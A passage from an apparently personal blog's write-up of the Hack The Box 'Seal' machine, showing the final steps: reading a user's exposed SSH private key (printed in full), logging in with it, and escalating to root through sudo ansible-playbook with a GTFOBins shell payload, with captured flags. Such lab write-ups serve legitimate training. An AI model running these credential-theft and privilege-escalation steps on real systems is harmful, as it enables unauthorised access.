+[..]
+dashboard/uploads/.ssh/
+dashboard/uploads/.ssh/id_rsa
+dashboard/uploads/.ssh/id_rsa.pub
+dashboard/uploads/.ssh/authorized_keys
+[..]
+</code></pre>
+<h2 id=shell-as-luis>Shell as Luis</h2>
+<p>And we can see that luis is using his public key to login his machine in SSH,</p>
+<pre><code>tomcat@seal:/dev/shm/dashboard$ cat ./uploads/.ssh/authorized_keys
+ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQCzeQhIJ510ppwJCFVylNNVwvEz2raJArOL2GyeUS3RnuRyFmtJmwYOQgPv2D/heuegpeba53SCZnF1UlQBDfcqDc2TpzMMjTB6+v9h8GkKRebmuyd+jnOMS5UagxMmE1nyI67uwINlkDqxfjw4W24XrO5SAWrMet0etHj5gVrCA/w6An01aRqmaa2STFwRsXifX6/+X7viQSa2LuNOJNJCA+v9OhN29C3DXb5hp9W0SQH/yKkScAigP8Hok453ik9M2BfxEw9Yf3eZK2upuWcw5Ym2j1ikvGEzje/0joRSN7yCn8RxKu8cMF7MQQzNlL4htw/6GfDl6Vp24ua11NIw9MJaSkj2Fcc1T2eNwP5NFH8D3RUep2ouVomSAL3OlFcHbT3oNXEVh04tyOB43etycIASFDvlWwQdcT80eA7zOMPajdycA7OwzJCuo1e09r6oeNUNyH9PVONKUJbEAUfL84g/EG6kT+RsSjLX50ke5H6ASnrIyV+oXIRWFRsOrKE= luis@seal
+
+tomcat@seal:/dev/shm/dashboard$ cat ./uploads/.ssh/id_rsa.pub
+ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQCzeQhIJ510ppwJCFVylNNVwvEz2raJArOL2GyeUS3RnuRyFmtJmwYOQgPv2D/heuegpeba53SCZnF1UlQBDfcqDc2TpzMMjTB6+v9h8GkKRebmuyd+jnOMS5UagxMmE1nyI67uwINlkDqxfjw4W24XrO5SAWrMet0etHj5gVrCA/w6An01aRqmaa2STFwRsXifX6/+X7viQSa2LuNOJNJCA+v9OhN29C3DXb5hp9W0SQH/yKkScAigP8Hok453ik9M2BfxEw9Yf3eZK2upuWcw5Ym2j1ikvGEzje/0joRSN7yCn8RxKu8cMF7MQQzNlL4htw/6GfDl6Vp24ua11NIw9MJaSkj2Fcc1T2eNwP5NFH8D3RUep2ouVomSAL3OlFcHbT3oNXEVh04tyOB43etycIASFDvlWwQdcT80eA7zOMPajdycA7OwzJCuo1e09r6oeNUNyH9PVONKUJbEAUfL84g/EG6kT+RsSjLX50ke5H6ASnrIyV+oXIRWFRsOrKE= luis@seal
+</code></pre>
+<p>so we just need his private key to remotely SSH.</p>
+<pre><code>tomcat@seal:/dev/shm/dashboard$ cat ./uploads/.ssh/id_rsa
+-----BEGIN OPENSSH PRIVATE KEY-----
+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
+u8KqOiDVrwmFJRAAAACWx1aXNAc2VhbAE=
+-----END OPENSSH PRIVATE KEY-----
+</code></pre>
+<p>and then we get the user flag and proper shell 😄</p>
+<pre><code>$ echo &quot;&lt;PRIVATE KEY&gt;&quot; &gt; id_rsa_seal
+$ chmod 600 id_rsa_seal
+$ ssh -i id_rsa_seal luis@seal.htb
+luis@seal:~$ cat user.txt
+eeffaf92bb67c9d686b14e7e7c65a932
+</code></pre>
+<p>We find in sudoers file that luis can execute any ansible-playbook:</p>
+<pre><code>luis@seal:~$ sudo -l
+Matching Defaults entries for luis on seal:
+    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin
+
+User luis may run the following commands on seal:
+    (ALL) NOPASSWD: /usr/bin/ansible-playbook *
+</code></pre>
+<p>GTFObins gives us an easy privilege escalation for <a href=https://gtfobins.github.io/gtfobins/ansible-playbook/>ansible-playbook</a>:</p>
+<pre tabindex=0><code>TF=$(mktemp)
+echo '[{hosts: localhost, tasks: [shell: /bin/sh &lt;/dev/tty &gt;/dev/tty 2&gt;/dev/tty]}]' &gt;$TF
+sudo ansible-playbook $TF
+[..]
+# id
+uid=0(root) gid=0(root) groups=0(root)
+# cat /root/root.txt
+b0e46a290f728edbff2bf7f0bda53663
+</code></pre>
+</div>
+</article>
+<hr>
+<div class=sharing-buttons>
+<a class=resp-sharing-button__link href="https://facebook.com/sharer/sharer.php?u=https%3a%2f%2f0xade1.github.io%2fposts%2f2021%2f10%2fhtb-seal%2f" target=_blank rel=noopener aria-label title="Share on facebook">
+<div class="resp-sharing-button resp-sharing-button--facebook resp-sharing-button--small"><div aria-hidden=true class="resp-sharing-button__icon resp-sharing-button__icon--solid"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentcolor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M18 2h-3a5 5 0 00-5 5v3H7v4h3v8h4v-8h3l1-4h-4V7a1 1 0 011-1h3z"/></svg>
+</div>
+</div>
+</a>
+<a class=resp-sharing-button__link href="https://twitter.com/intent/tweet/?url=https%3a%2f%2f0xade1.github.io%2fposts%2f2021%2f10%2fhtb-seal%2f" target=_blank rel=noopener aria-label title="Share on twitter">
+<div class="resp-sharing-button resp-sharing-button--twitter resp-sharing-button--small">
+<div aria-hidden=true class="resp-sharing-button__icon resp-sharing-button__icon--solid"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentcolor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M23 3a10.9 10.9.0 01-3.14 1.53 4.48 4.48.0 00-7.86 3v1A10.66 10.66.0 013 4s-4 9 5 13a11.64 11.64.0 01-7 2c9 5 20 0 20-11.5a4.5 4.5.0 00-.08-.83A7.72 7.72.0 0023 3z"/></svg>
+</div>
+</div>
+</a>
+<a class=resp-sharing-button__link href="https://www.tumblr.com/widgets/share/tool?posttype=link&title=Htb%20Seal&caption=Htb%20Seal&canonicalUrl=https%3a%2f%2f0xade1.github.io%2fposts%2f2021%2f10%2fhtb-seal%2f" target=_blank rel=noopener aria-label title="Share on tumblr">
+<div class="resp-sharing-button resp-sharing-button--tumblr resp-sharing-button--small">
+<div aria-hidden=true class="resp-sharing-button__icon resp-sharing-button__icon--solid"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="currentcolor" stroke="none" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M14.563 24c-5.093.0-7.031-3.756-7.031-6.411V9.747H5.116V6.648c3.63-1.313 4.512-4.596 4.71-6.469C9.84.051 9.941.0 9.999.0h3.517v6.114h4.801v3.633h-4.82v7.47c.016 1.001.375 2.371 2.207 2.371h.09c.631-.02 1.486-.205 1.936-.419l1.156 3.425c-.436.636-2.4 1.374-4.156 1.404h-.178l.011.002z"/></svg>
+</div>
+</div>
+</a>
+<a class=resp-sharing-button__link href="mailto:?subject=Htb%20Seal&body=https%3a%2f%2f0xade1.github.io%2fposts%2f2021%2f10%2fhtb-seal%2f" target=_self rel=noopener aria-label title="Share via email">
+<div class="resp-sharing-button resp-sharing-button--email resp-sharing-button--small"><div aria-hidden=true class="resp-sharing-button__icon resp-sharing-button__icon--solid"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentcolor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M4 4h16c1.1.0 2 .9 2 2v12c0 1.1-.9 2-2 2H4c-1.1.0-2-.9-2-2V6c0-1.1.9-2 2-2z"/><polyline points="22,6 12,13 2,6"/></svg>
+</div>
+</div>
+</a>
+<a class=resp-sharing-button__link href="https://pinterest.com/pin/create/button/?url=https%3a%2f%2f0xade1.github.io%2fposts%2f2021%2f10%2fhtb-seal%2f&media=https%3a%2f%2f0xade1.github.io%2fposts%2f2021%2f10%2fhtb-seal%2f;description=Htb%20Seal" target=_blank rel=noopener aria-label title="Share on pinterest">
+<div class="resp-sharing-button resp-sharing-button--pinterest resp-sharing-button--small"><div aria-hidden=true class="resp-sharing-button__icon resp-sharing-button__icon--solid"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="currentcolor" stroke="none"><path d="M12.017.0C5.396.0.029 5.367.029 11.987c0 5.079 3.158 9.417 7.618 11.162-.105-.949-.199-2.403.041-3.439.219-.937 1.406-5.957 1.406-5.957s-.359-.72-.359-1.781c0-1.663.967-2.911 2.168-2.911 1.024.0 1.518.769 1.518 1.688.0 1.029-.653 2.567-.992 3.992-.285 1.193.6 2.165 1.775 2.165 2.128.0 3.768-2.245 3.768-5.487.0-2.861-2.063-4.869-5.008-4.869-3.41.0-5.409 2.562-5.409 5.199.0 1.033.394 2.143.889 2.741.099.12.112.225.085.345-.09.375-.293 1.199-.334 1.363-.053.225-.172.271-.401.165-1.495-.69-2.433-2.878-2.433-4.646.0-3.776 2.748-7.252 7.92-7.252 4.158.0 7.392 2.967 7.392 6.923.0 4.135-2.607 7.462-6.233 7.462-1.214.0-2.354-.629-2.758-1.379l-.749 2.848c-.269 1.045-1.004 2.352-1.498 3.146 1.123.345 2.306.535 3.55.535 6.607.0 11.985-5.365 11.985-11.987C23.97 5.39 18.592.026 11.985.026L12.017.0z"/></svg>
+</div>
+</div>
+</a>
+<a class=resp-sharing-button__link href="https://www.linkedin.com/shareArticle?mini=true&url=https%3a%2f%2f0xade1.github.io%2fposts%2f2021%2f10%2fhtb-seal%2f&title=Htb%20Seal&summary=Htb%20Seal&source=https%3a%2f%2f0xade1.github.io%2fposts%2f2021%2f10%2fhtb-seal%2f" target=_blank rel=noopener aria-label title="Share on linkedin">
+<div class="resp-sharing-button resp-sharing-button--linkedin resp-sharing-button--small"><div aria-hidden=true class="resp-sharing-button__icon resp-sharing-button__icon--solid"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentcolor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M16 8a6 6 0 016 6v7h-4v-7a2 2 0 00-2-2 2 2 0 00-2 2v7h-4v-7a6 6 0 016-6z"/><rect x="2" y="9" width="4" height="12"/><circle cx="4" cy="4" r="2"/></svg>
+</div>
+</div>
+</a>
+<a class=resp-sharing-button__link href="https://reddit.com/submit/?url=https%3a%2f%2f0xade1.github.io%2fposts%2f2021%2f10%2fhtb-seal%2f&resubmit=true&title=Htb%20Seal" target=_blank rel=noopener aria-label title="Share on reddit">
+<div class="resp-sharing-button resp-sharing-button--reddit resp-sharing-button--small"><div aria-hidden=true class="resp-sharing-button__icon resp-sharing-button__icon--solid"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="currentcolor" stroke="none"><path d="M12 0A12 12 0 000 12a12 12 0 0012 12 12 12 0 0012-12A12 12 0 0012 0zm5.01 4.744c.688.0 1.25.561 1.25 1.249a1.25 1.25.0 01-2.498.056l-2.597-.547-.8 3.747c1.824.07 3.48.632 4.674 1.488.308-.309.73-.491 1.207-.491.968.0 1.754.786 1.754 1.754.0.716-.435 1.333-1.01 1.614a3.111 3.111.0 01.042.52c0 2.694-3.13 4.87-7.004 4.87s-7.004-2.176-7.004-4.87c0-.183.015-.366.043-.534A1.748 1.748.0 014.028 12c0-.968.786-1.754 1.754-1.754.463.0.898.196 1.207.49 1.207-.883 2.878-1.43 4.744-1.487l.885-4.182a.342.342.0 01.14-.197.35.35.0 01.238-.042l2.906.617a1.214 1.214.0 011.108-.701zM9.25 12C8.561 12 8 12.562 8 13.25c0 .687.561 1.248 1.25 1.248.687.0 1.248-.561 1.248-1.249S9.937 12 9.249 12zm5.5.0c-.687.0-1.248.561-1.248 1.25.0.687.561 1.248 1.249 1.248S16 13.937 16 13.249c0-.687-.562-1.249-1.25-1.249zm-5.466 3.99a.327.327.0 00-.231.094.33.33.0 000 .463c.842.842 2.484.913 2.961.913s2.105-.056 2.961-.913a.361.361.0 00.029-.463.33.33.0 00-.464.0c-.547.533-1.684.73-2.512.73-.828.0-1.979-.196-2.512-.73a.326.326.0 00-.232-.095z"/></svg>
+</div>
+</div>
+</a>
+<a class=resp-sharing-button__link href="https://www.xing.com/app/user?op=share;url=https%3a%2f%2f0xade1.github.io%2fposts%2f2021%2f10%2fhtb-seal%2f;title=Htb%20Seal" target=_blank rel=noopener aria-label title="Share on xing">
+<div class="resp-sharing-button resp-sharing-button--xing resp-sharing-button--small"><div aria-hidden=true class="resp-sharing-button__icon resp-sharing-button__icon--solid"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="currentcolor" stroke="none"><path d="M18.188.0c-.517.0-.741.325-.927.66.0.0-7.455 13.224-7.702 13.657.015.024 4.919 9.023 4.919 9.023.17.308.436.66.967.66h3.454c.211.0.375-.078.463-.22.089-.151.089-.346-.009-.536l-4.879-8.916c-.004-.006-.004-.016.0-.022L22.139.756c.095-.191.097-.387.006-.535C22.056.078 21.894.0 21.686.0h-3.498zM3.648 4.74c-.211.0-.385.074-.473.216-.09.149-.078.339.02.531l2.34 4.05c.004.01.004.016.0.021L1.86 16.051c-.099.188-.093.381.0.529.085.142.239.234.45.234h3.461c.518.0.766-.348.945-.667l3.734-6.609-2.378-4.155c-.172-.315-.434-.659-.962-.659H3.648v.016z"/></svg>
+</div>
+</div>
+</a>
+<a class=resp-sharing-button__link href="whatsapp://send?text=Htb%20Seal%20https%3a%2f%2f0xade1.github.io%2fposts%2f2021%2f10%2fhtb-seal%2f" target=_blank rel=noopener aria-label title="Share on whatsapp">
+<div class="resp-sharing-button resp-sharing-button--whatsapp resp-sharing-button--small"><div aria-hidden=true class="resp-sharing-button__icon resp-sharing-button__icon--solid"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="currentcolor" stroke="none" stroke-width="1" stroke-linecap="round" stroke-linejoin="round"><path d="M17.472 14.382c-.297-.149-1.758-.867-2.03-.967-.273-.099-.471-.148-.67.15-.197.297-.767.966-.94 1.164-.173.199-.347.223-.644.075-.297-.15-1.255-.463-2.39-1.475-.883-.788-1.48-1.761-1.653-2.059-.173-.297-.018-.458.13-.606.134-.133.298-.347.446-.52.149-.174.198-.298.298-.497.099-.198.05-.371-.025-.52-.075-.149-.669-1.612-.916-2.207-.242-.579-.487-.5-.669-.51-.173-.008-.371-.01-.57-.01-.198.0-.52.074-.792.372-.272.297-1.04 1.016-1.04 2.479.0 1.462 1.065 2.875 1.213 3.074.149.198 2.096 3.2 5.077 4.487.709.306 1.262.489 1.694.625.712.227 1.36.195 1.871.118.571-.085 1.758-.719 2.006-1.413.248-.694.248-1.289.173-1.413-.074-.124-.272-.198-.57-.347m-5.421 7.403h-.004a9.87 9.87.0 01-5.031-1.378l-.361-.214-3.741.982.998-3.648-.235-.374a9.86 9.86.0 01-1.51-5.26c.001-5.45 4.436-9.884 9.888-9.884 2.64.0 5.122 1.03 6.988 2.898a9.825 9.825.0 012.893 6.994c-.003 5.45-4.437 9.884-9.885 9.884m8.413-18.297A11.815 11.815.0 0012.05.0C5.495.0.16 5.335.157 11.892c0 2.096.547 4.142 1.588 5.945L.057 24l6.305-1.654a11.882 11.882.0 005.683 1.448h.005c6.554.0 11.89-5.335 11.893-11.893a11.821 11.821.0 00-3.48-8.413z"/></svg>
+</div>
+</div>
+</a>
+<a class=resp-sharing-button__link href="https://news.ycombinator.com/submitlink?u=https%3a%2f%2f0xade1.github.io%2fposts%2f2021%2f10%2fhtb-seal%2f&t=Htb%20Seal" target=_blank rel=noopener aria-label title="Share on hacker news">
+<div class="resp-sharing-button resp-sharing-button--hackernews resp-sharing-button--small"><div aria-hidden=true class="resp-sharing-button__icon resp-sharing-button__icon--solid"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="currentcolor" stroke="none"><path d="M0 24V0h24v24H0zM6.951 5.896l4.112 7.708v5.064h1.583v-4.972l4.148-7.799h-1.749l-2.457 4.875c-.372.745-.688 1.434-.688 1.434s-.297-.708-.651-1.434L8.831 5.896h-1.88z"/></svg>
+</div>
+</div>
+</a>
+<a class=resp-sharing-button__link href="https://telegram.me/share/url?text=Htb%20Seal&url=https%3a%2f%2f0xade1.github.io%2fposts%2f2021%2f10%2fhtb-seal%2f" target=_blank rel=noopener aria-label title="Share on telegram">
+<div class="resp-sharing-button resp-sharing-button--telegram resp-sharing-button--small"><div aria-hidden=true class="resp-sharing-button__icon resp-sharing-button__icon--solid"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentcolor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><line x1="22" y1="2" x2="11" y2="13"/><polygon points="22 2 15 22 11 13 2 9 22 2"/></svg>
+</div>
+</div>
+</a>
+</div>
+<hr>
+<div class=pagination>
+<div class=pagination__title>
+<span class=pagination__title-h></span>
+</div>
+<div class=pagination__buttons>
+<a href=https://0xade1.github.io/posts/2021/10/htb-intelligence/ class="button previous">
+<span class=button__icon>←</span>
+<span class=button__text>HTB - Intelligence</span>
+</a>
+<a href=https://0xade1.github.io/posts/2021/10/htb-writer/ class="button next">
+<span class=button__text>Htb Writer</span>
+<span class=button__icon>→</span>
+</a>
+</div>
+</div>
+<hr>
+</main>
+</div>
+<footer class=footer>
+<div class=footer__inner>
+<div class=footer__content>
+<span>&copy; 2022</span>
+<span><a href=https://0xade1.github.io/posts/index.xml target=_blank title=rss><svg xmlns="http://www.w3.org/2000/svg" width="18" height="18" viewBox="0 0 20 20" fill="none" stroke="currentcolor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="feather feather-rss"><path d="M4 11a9 9 0 019 9"/><path d="M4 4a16 16 0 0116 16"/><circle cx="5" cy="19" r="1"/></svg></a></span>
+</div>
+</div>
+<div class=footer__inner>
+<div class=footer__content>
+<span>Powered by <a href=http://gohugo.io>Hugo</a></span>
+<span>Made with &#10084;</span>
+</div>
+</div>
+</footer>
+</div>
+<script type=text/javascript src=https://0xade1.github.io/bundle.min.7015b843bafc394b6094818242f153559f5ca94b331b9faaf6132652c59619aefe60ae36e1637f7ee14fd953892639f466c25095c36d42203a1c195313e93212.js integrity="sha512-cBW4Q7r8OUtglIGCQvFTVZ9cqUszG5+q9hMmUsWWGa7+YK424WN/fuFP2VOJJjn0ZsJQlcNtQiA6HBlTE+kyEg=="></script>
+</body>
+</html>
